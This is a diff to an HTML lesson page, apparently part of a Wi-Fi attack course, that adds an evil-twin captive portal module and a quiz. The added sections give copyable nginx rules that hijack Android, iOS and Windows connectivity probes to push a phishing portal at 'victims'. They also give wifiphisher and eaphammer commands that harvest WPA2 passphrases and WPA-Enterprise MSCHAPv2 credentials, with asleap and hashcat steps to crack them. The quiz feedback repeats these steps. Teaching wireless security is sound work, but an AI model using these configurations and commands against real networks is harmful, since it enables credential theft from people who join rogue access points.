@@ -152,6 +152,27 @@
     .nav-btn.prev { border:1px solid var(--border); color:var(--text-dim); }
     .nav-btn.prev:hover { border-color:var(--accent); color:var(--accent); }
 
+    /* Quiz */
+    .quiz-container { background:var(--bg-card); border:1px solid var(--border); border-radius:var(--radius); padding:28px; margin:24px 0; }
+    .quiz-container h3 { font-size:14px; color:var(--accent); margin-bottom:20px; display:flex; align-items:center; gap:8px; }
+    .quiz-question { margin-bottom:28px; }
+    .quiz-question .q-text { font-size:14px; color:var(--text-head); margin-bottom:14px; line-height:1.5; }
+    .quiz-question .q-num { font-family:var(--font-mono); font-size:11px; color:var(--accent); margin-bottom:6px; }
+    .option-list { display:flex; flex-direction:column; gap:8px; }
+    .option-btn { background:var(--bg); border:1px solid var(--border); border-radius:6px; padding:10px 16px; color:var(--text); text-align:left; cursor:pointer; font-size:13px; transition:all 0.15s; font-family:var(--font-body); }
+    .option-btn:hover { border-color:var(--accent); color:var(--text-head); }
+    .option-btn.correct { border-color:var(--accent2); background:rgba(63,185,80,0.08); color:var(--accent2); }
+    .option-btn.wrong { border-color:var(--accent3); background:rgba(247,129,102,0.08); color:var(--accent3); }
+    .option-btn:disabled { cursor:default; }
+    .quiz-feedback { margin-top:10px; font-size:13px; padding:10px 14px; border-radius:6px; display:none; line-height:1.5; }
+    .quiz-feedback.show { display:block; }
+    .quiz-feedback.correct-fb { background:rgba(63,185,80,0.08); border:1px solid rgba(63,185,80,0.3); color:var(--accent2); }
+    .quiz-feedback.wrong-fb { background:rgba(247,129,102,0.08); border:1px solid rgba(247,129,102,0.3); color:var(--accent3); }
+    .quiz-score { display:none; text-align:center; padding:20px; border-top:1px solid var(--border); margin-top:20px; }
+    .quiz-score.show { display:block; }
+    .score-num { font-size:3rem; font-weight:700; color:var(--accent); font-family:var(--font-mono); }
+    .score-label { font-size:14px; color:var(--text-dim); margin-top:4px; }
+
     ::-webkit-scrollbar { width:6px; height:6px; }
     ::-webkit-scrollbar-track { background:var(--bg); }
     ::-webkit-scrollbar-thumb { background:var(--border); border-radius:3px; }
@@ -464,7 +485,113 @@
       </div>
     </section>
 
-    <!-- Section 7: Countermeasures -->
+    <!-- Section 7b: OS Captive Portal Probes -->
+    <section id="os-probes">
+      <h2><span class="section-num">07</span> OS Captive Portal Detection &amp; Bypass</h2>
+      <p>
+        Every modern OS probes specific URLs at Wi-Fi connection time to detect captive portals.
+        Responding correctly triggers the OS's built-in "Sign in to network" popup — getting your portal
+        in front of the victim without them even opening a browser.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead><tr><th>OS</th><th>Probe URL</th><th>Expected Response</th><th>Your Response</th></tr></thead>
+          <tbody>
+            <tr><td>Android</td><td><code>connectivitycheck.gstatic.com/generate_204</code></td><td>HTTP 204</td><td><code>302 → http://10.0.0.1/</code></td></tr>
+            <tr><td>iOS / macOS</td><td><code>captive.apple.com/hotspot-detect.html</code></td><td>Body has <code>&lt;Success&gt;</code></td><td>Return HTML without <code>&lt;Success&gt;</code></td></tr>
+            <tr><td>Windows</td><td><code>www.msftconnecttest.com/connecttest.txt</code></td><td>Body: Microsoft Connect Test</td><td><code>302 → http://10.0.0.1/</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">nginx — handle OS captive portal probes</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-probes')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-probes"><span class="cmt"># nginx captive portal detection handler — add to server block</span>
+
+<span class="out"><span class="cfg-key">location</span> /generate_204 {</span>
+<span class="out">    <span class="cfg-key">return</span> 302 http://10.0.0.1/;   <span class="cmt"># Android: redirect triggers portal popup</span></span>
+<span class="out">}</span>
+
+<span class="out"><span class="cfg-key">location</span> /hotspot-detect.html {</span>
+<span class="out">    <span class="cfg-key">add_header</span> Content-Type text/html;</span>
+<span class="out">    <span class="cfg-key">return</span> 200 <span class="str">'&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;CoffeeShop WiFi&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;Login Required&lt;/BODY&gt;&lt;/HTML&gt;'</span>;</span>
+<span class="out">    <span class="cmt"># iOS: body WITHOUT &lt;Success&gt; → iOS detects captive portal → shows popup</span></span>
+<span class="out">}</span>
+
+<span class="out"><span class="cfg-key">location</span> /connecttest.txt {</span>
+<span class="out">    <span class="cfg-key">return</span> 302 http://10.0.0.1/;   <span class="cmt"># Windows: redirect triggers portal notification</span></span>
+<span class="out">}</span></div>
+      </div>
+
+      <div class="callout tip">
+        <span class="ci">&#128241;</span>
+        <div><strong>Result:</strong> Android shows "Sign in to CoffeeShop WiFi". iOS shows a SafariViewController popup. Windows shows a notification balloon. All three open your portal page automatically — the victim doesn't need to open a browser.</div>
+      </div>
+    </section>
+
+    <!-- Section 8: wifiphisher + eaphammer -->
+    <section id="automated-tools">
+      <h2><span class="section-num">08</span> Automated Tools: wifiphisher &amp; eaphammer</h2>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">wifiphisher — automated evil twin + captive portal</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-wifiphisher')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-wifiphisher"><span class="cmt"># Install</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo apt install wifiphisher</span>
+
+<span class="cmt"># Launch interactive target selection</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifiphisher</span>
+
+<span class="cmt"># Target specific SSID with firmware-upgrade portal (captures WPA2 PSK)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo wifiphisher <span class="flag">--essid</span> <span class="str">"CoffeeShop"</span> <span class="flag">--phishing-page</span> <span class="str">firmware-upgrade</span> <span class="flag">--interface</span> wlan0 <span class="flag">--wIface</span> wlan1</span>
+<span class="cmt"># --essid             → target SSID to clone</span>
+<span class="cmt"># --phishing-page     → portal template (firmware-upgrade captures WPA2 PSK)</span>
+<span class="cmt"># --interface         → internet-facing interface (for NAT)</span>
+<span class="cmt"># --wIface            → AP interface</span>
+
+<span class="out-warn">[*] Available portal templates: firmware-upgrade, oauth-login, wifi_connect, plugin_update</span></div>
+      </div>
+
+      <div class="terminal">
+        <div class="terminal-bar">
+          <div class="terminal-dots"><span class="d-red"></span><span class="d-yellow"></span><span class="d-green"></span></div>
+          <span class="terminal-title">eaphammer + asleap — WPA-Enterprise credential theft</span>
+          <button class="terminal-copy" onclick="copyTerm(this,'copy-eaphammer')">Copy</button>
+        </div>
+        <div class="terminal-body" id="copy-eaphammer"><span class="cmt"># eaphammer: modern WPA-Enterprise rogue AP + credential capture</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">git clone https://github.com/s0lst1c3/eaphammer.git && cd eaphammer</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo python3 eaphammer <span class="flag">--interface</span> wlan1 <span class="flag">--essid</span> <span class="str">CorpWiFi</span> <span class="flag">--auth</span> peap <span class="flag">--creds</span></span>
+<span class="cmt"># --interface   → AP interface</span>
+<span class="cmt"># --essid       → target enterprise SSID</span>
+<span class="cmt"># --auth peap   → EAP method (peap, ttls, eap-fast)</span>
+<span class="cmt"># --creds       → capture and display MSCHAPv2 credentials</span>
+
+<span class="out-warn">[+] MSCHAPv2 captured:</span>
+<span class="out-ok">    Username:  alice@corp.com</span>
+<span class="out-ok">    Challenge: 5d9b4b1f3a2e7c8d</span>
+<span class="out-ok">    Response:  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0</span>
+
+<span class="cmt"># Crack MSCHAPv2 hash with asleap</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">sudo asleap <span class="flag">-C</span> <span class="str">5d9b4b1f3a2e7c8d</span> <span class="flag">-R</span> <span class="str">a1b2c3d4e5f6...</span> <span class="flag">-W</span> <span class="str">/usr/share/wordlists/rockyou.txt</span></span>
+<span class="cmt"># -C = challenge bytes from eaphammer/hostapd-wpe output</span>
+<span class="cmt"># -R = response bytes</span>
+<span class="cmt"># -W = wordlist file</span>
+<span class="out-ok">hash bytes: a1b2c3... → password: Summer2024!</span>
+
+<span class="cmt"># Alternative: hashcat -m 5500 (NetNTLMv1/MSCHAPv2)</span>
+<span class="prompt">kali@kali:~$ </span><span class="cmd">hashcat <span class="flag">-m</span> <span class="str">5500</span> <span class="str">mschap.hash</span> <span class="str">/usr/share/wordlists/rockyou.txt</span></span></div>
+      </div>
+    </section>
+
+    <!-- Section 9: Countermeasures -->
     <section id="countermeasures">
       <h2><span class="section-num">07</span> Detection &amp; Countermeasures</h2>
 
@@ -489,6 +616,124 @@
       </div>
     </section>
 
+    <!-- Section 10: Quiz -->
+    <section id="quiz">
+      <h2><span class="section-num">10</span> Knowledge Check</h2>
+
+      <div class="quiz-container">
+        <h3>&#127358; Module 10 Quiz &nbsp;<span style="font-size:11px;color:var(--text-dim);font-weight:400">8 questions</span></h3>
+
+        <!-- Q1 -->
+        <div class="quiz-question" id="q1">
+          <div class="q-num">Question 1 of 8</div>
+          <div class="q-text">What does the dnsmasq directive <code>address=/#/10.0.0.1</code> do, and why is it essential for a captive portal?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q1',false)">It assigns the IP 10.0.0.1 to the AP's DHCP gateway only</button>
+            <button class="option-btn" onclick="answer(this,'q1',true)">It returns 10.0.0.1 for ALL DNS queries regardless of domain — redirecting every website the victim visits to the attacker's web server, enabling the portal page to appear for any URL</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">It blocks DNS queries from the 10.0.0.0/24 subnet</button>
+            <button class="option-btn" onclick="answer(this,'q1',false)">It configures dnsmasq to forward all queries to 10.0.0.1 as an upstream DNS server</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q1"></div>
+        </div>
+
+        <!-- Q2 -->
+        <div class="quiz-question" id="q2">
+          <div class="q-num">Question 2 of 8</div>
+          <div class="q-text">What is the purpose of the iptables rule <code>-t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to-port 80</code>?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q2',false)">It blocks all port 80 traffic from clients on wlan1</button>
+            <button class="option-btn" onclick="answer(this,'q2',true)">It intercepts all TCP port 80 connections arriving on wlan1 and redirects them to the local nginx server — catching clients who bypass DNS by typing IP addresses directly</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">It forwards port 80 from the attacker to the internet so clients can browse normally</button>
+            <button class="option-btn" onclick="answer(this,'q2',false)">It allows DNS (port 53 UDP) traffic through the AP interface</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q2"></div>
+        </div>
+
+        <!-- Q3 -->
+        <div class="quiz-question" id="q3">
+          <div class="q-num">Question 3 of 8</div>
+          <div class="q-text">Android probes <code>connectivitycheck.gstatic.com/generate_204</code> when connecting to Wi-Fi. What response should your nginx return to trigger the captive portal popup?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q3',false)">HTTP 204 No Content — the expected response that tells Android no portal exists</button>
+            <button class="option-btn" onclick="answer(this,'q3',true)">HTTP 302 redirect to <code>http://10.0.0.1/</code> — any non-204 response tells Android a captive portal is present, triggering the "Sign in" notification</button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">HTTP 200 with body containing <code>&lt;Success&gt;</code></button>
+            <button class="option-btn" onclick="answer(this,'q3',false)">HTTP 403 Forbidden — this blocks Android's check and forces a browser redirect</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q3"></div>
+        </div>
+
+        <!-- Q4 -->
+        <div class="quiz-question" id="q4">
+          <div class="q-num">Question 4 of 8</div>
+          <div class="q-text">What does the PHP <code>file_put_contents('/var/log/harvested.log', $entry, FILE_APPEND | LOCK_EX)</code> call do?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q4',false)">It overwrites the log file with the new entry on each submission</button>
+            <button class="option-btn" onclick="answer(this,'q4',true)">It appends the new credential entry to the log file (FILE_APPEND) with an exclusive lock (LOCK_EX) to prevent race conditions when multiple victims submit simultaneously</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">It sends the credentials to a remote server using file_put_contents's URL mode</button>
+            <button class="option-btn" onclick="answer(this,'q4',false)">It creates a new file for each submission using a sequential counter</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q4"></div>
+        </div>
+
+        <!-- Q5 -->
+        <div class="quiz-question" id="q5">
+          <div class="q-num">Question 5 of 8</div>
+          <div class="q-text">Why is SSL stripping ineffective against Google or banking websites in 2024?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q5',false)">Because these sites use TLS 1.3 which cannot be downgraded by bettercap</button>
+            <button class="option-btn" onclick="answer(this,'q5',true)">Because they are on the HSTS Preload list — browsers have them hardcoded as HTTPS-only and will refuse HTTP connections regardless of any MITM proxy, redirect, or DNS manipulation</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">Because their servers detect bettercap's User-Agent and block connections</button>
+            <button class="option-btn" onclick="answer(this,'q5',false)">Because Google and banks use certificate pinning that nginx cannot bypass</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q5"></div>
+        </div>
+
+        <!-- Q6 -->
+        <div class="quiz-question" id="q6">
+          <div class="q-num">Question 6 of 8</div>
+          <div class="q-text">How does Modlishka differ from a traditional cloned-page captive portal, and what is its main advantage?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q6',false)">Modlishka uses SSL stripping to downgrade HTTPS automatically — no proxy needed</button>
+            <button class="option-btn" onclick="answer(this,'q6',true)">Modlishka is a transparent reverse proxy — it proxies the REAL target site instead of serving a clone. The victim sees a valid TLS certificate (Modlishka's CA), making it far more convincing than a static clone page</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Modlishka generates fake WPA2 certificates to bypass enterprise authentication</button>
+            <button class="option-btn" onclick="answer(this,'q6',false)">Modlishka only works with WEP networks and captures IVs instead of credentials</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q6"></div>
+        </div>
+
+        <!-- Q7 -->
+        <div class="quiz-question" id="q7">
+          <div class="q-num">Question 7 of 8</div>
+          <div class="q-text">eaphammer captures MSCHAPv2 challenge/response pairs from WPA-Enterprise clients. What tool cracks these pairs offline?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q7',false)">aircrack-ng using mode -m 22000</button>
+            <button class="option-btn" onclick="answer(this,'q7',true)">asleap (with -C challenge -R response -W wordlist) or hashcat with mode -m 5500 (NetNTLMv1/MSCHAPv2)</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">hcxpcapngtool converting the .pcapng to .hc22000 format</button>
+            <button class="option-btn" onclick="answer(this,'q7',false)">john --format=wpapsk using the captured .cap file</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q7"></div>
+        </div>
+
+        <!-- Q8 -->
+        <div class="quiz-question" id="q8">
+          <div class="q-num">Question 8 of 8</div>
+          <div class="q-text">What does the <code>wifiphisher --phishing-page firmware-upgrade</code> flag do?</div>
+          <div class="option-list">
+            <button class="option-btn" onclick="answer(this,'q8',false)">It upgrades the wifiphisher software to the latest version before launching</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">It injects a firmware backdoor into connected clients via HTTP</button>
+            <button class="option-btn" onclick="answer(this,'q8',true)">It serves a "router firmware upgrade required" portal template that tricks users into entering their WPA2 passphrase to "authenticate the firmware update" — capturing the PSK directly</button>
+            <button class="option-btn" onclick="answer(this,'q8',false)">It deploys a firmware extraction attack against the target AP's bootloader</button>
+          </div>
+          <div class="quiz-feedback" id="fb-q8"></div>
+        </div>
+
+        <div class="quiz-score" id="quizScore">
+          <div class="score-num" id="scoreNum">0/8</div>
+          <div class="score-label" id="scoreLabel"></div>
+        </div>
+      </div>
+    </section>
+
     <!-- Nav -->
     <div class="nav-footer">
       <a href="../module-09-evil-twin/" class="nav-btn prev">&#8592; Module 09: Evil Twin</a>
@@ -498,6 +743,78 @@
 </div>
 
 <script>
+  // ── Quiz ──────────────────────────────────────────────────────
+  const TOTAL_Q = 8;
+  const qAnswered = {};
+  const qFeedbacks = {
+    q1: {
+      correct: "Correct. In dnsmasq, address=/#/IP is a wildcard that matches every possible domain name and returns the specified IP. '#' is a special wildcard. This means google.com, facebook.com, bank.com — every single DNS query returns 10.0.0.1. The victim's browser opens any URL and always lands on the attacker's nginx server.",
+      wrong: "Incorrect. address=/#/10.0.0.1 is dnsmasq's wildcard address record. The '#' matches ALL domain names. Every DNS query from any client returns 10.0.0.1 — redirecting all web traffic to the attacker's server. This is the keystone of the captive portal attack."
+    },
+    q2: {
+      correct: "Correct. The PREROUTING REDIRECT rule intercepts packets before they are routed. Any TCP connection arriving on wlan1 destined for port 80 is transparently redirected to the local machine (127.0.0.1:80 where nginx listens). Even clients that type a direct IP address like '192.168.1.1' still hit the portal.",
+      wrong: "Incorrect. The PREROUTING REDIRECT rule in the NAT table intercepts incoming packets before routing and redirects them to a local port. Any TCP:80 arriving on wlan1 — regardless of original destination — is sent to the local nginx on port 80. This catches DNS bypass attempts."
+    },
+    q3: {
+      correct: "Correct. Android expects HTTP 204 No Content from the connectivity check URL. Any other response (200 with unexpected content, 302 redirect) tells Android's NetworkMonitor that a captive portal is present, triggering the 'Sign in to network' notification and automatically opening your portal.",
+      wrong: "Incorrect. Android expects 204 No Content from generate_204. Return anything else (301, 302, 200 with content) and Android's ConnectivityService detects a captive portal and shows the notification. A 302 redirect to your portal URL works perfectly."
+    },
+    q4: {
+      correct: "Correct. FILE_APPEND adds to the end of the file instead of overwriting. LOCK_EX acquires an exclusive file lock before writing, preventing two concurrent PHP processes (from two victims submitting at the same time) from corrupting the log file with interleaved writes.",
+      wrong: "Incorrect. FILE_APPEND ensures each new credential entry is added to the end of the log file (not overwriting). LOCK_EX acquires an exclusive lock during the write operation, preventing race conditions when multiple victims submit their credentials simultaneously."
+    },
+    q5: {
+      correct: "Correct. HSTS (HTTP Strict Transport Security) Preloading is a browser mechanism where a hardcoded list of domains is enforced as HTTPS-only. This list is compiled into browser binaries. Google, Facebook, all major banks are preloaded. No external tool — MITM proxy, bettercap, or redirect — can override this hardcoded list.",
+      wrong: "Incorrect. The reason is HSTS Preloading. Browser vendors maintain a hardcoded list of domains that must always use HTTPS. This list is compiled into the browser binary — no DNS manipulation, iptables redirect, or SSL strip tool can bypass it. TLS version and User-Agent are unrelated."
+    },
+    q6: {
+      correct: "Correct. Modlishka is a reverse proxy — it acts as an intermediary between the victim and the real website. The victim sees the real website's content with a TLS certificate signed by Modlishka's custom CA. There's no 'clone page' to make slightly wrong. The main requirement: Modlishka's CA cert must be trusted by the victim's browser (or they must accept the warning).",
+      wrong: "Incorrect. Modlishka is a transparent reverse proxy. It proxies the actual target website in real-time — the victim sees the real layout, real content, and a TLS certificate from Modlishka's custom CA. Traditional portals serve a static clone that may look slightly off. Modlishka is much harder to detect visually."
+    },
+    q7: {
+      correct: "Correct. asleap is purpose-built for cracking MSCHAPv2 challenge/response pairs captured from WPA-Enterprise/PEAP clients. Alternatively, hashcat mode -m 5500 handles NetNTLMv1 which shares the MSCHAPv2 structure. Both take the challenge and response bytes from the eaphammer or hostapd-wpe output.",
+      wrong: "Incorrect. MSCHAPv2 pairs are cracked with asleap (specific MSCHAPv2 cracker: asleap -C challenge -R response -W wordlist) or hashcat -m 5500 (NetNTLMv1 = MSCHAPv2). aircrack-ng -m 22000 is for WPA2 PSK. hcxpcapngtool is for PMKID conversion."
+    },
+    q8: {
+      correct: "Correct. The 'firmware-upgrade' template is one of wifiphisher's built-in portal pages. It impersonates the target router's admin interface claiming a firmware update is required. The victim is prompted to enter their WPA2 passphrase to 'authenticate the update' — directly capturing the PSK.",
+      wrong: "Incorrect. --phishing-page firmware-upgrade selects a portal template that shows a fake 'router firmware update' page. The victim is asked to enter their Wi-Fi password to 'authorize the upgrade' — this captures the WPA2 PSK without any handshake capture needed."
+    }
+  };
+
+  let qScore = 0;
+  let qCount = 0;
+
+  function answer(btn, qId, isCorrect) {
+    if (qAnswered[qId]) return;
+    qAnswered[qId] = true;
+    qCount++;
+    const qEl = document.getElementById(qId);
+    const buttons = qEl.querySelectorAll('.option-btn');
+    buttons.forEach(b => b.disabled = true);
+    const fb = document.getElementById('fb-' + qId);
+    if (isCorrect) {
+      btn.classList.add('correct');
+      qScore++;
+      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
+      fb.className = 'quiz-feedback correct-fb show';
+    } else {
+      btn.classList.add('wrong');
+      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
+      fb.className = 'quiz-feedback wrong-fb show';
+      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
+    }
+    if (qCount === TOTAL_Q) {
+      const scoreEl = document.getElementById('quizScore');
+      const numEl = document.getElementById('scoreNum');
+      const labelEl = document.getElementById('scoreLabel');
+      numEl.textContent = qScore + '/' + TOTAL_Q;
+      const pct = qScore / TOTAL_Q;
+      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 11!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the dnsmasq, OS probes, and SSL stripping sections.' : 'Re-read the DNS hijacking, iptables, HSTS, and Modlishka sections.';
+      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
+      scoreEl.classList.add('show');
+    }
+  }
+
   function copyTerm(btn, id) {
     const el = document.getElementById(id);
     navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
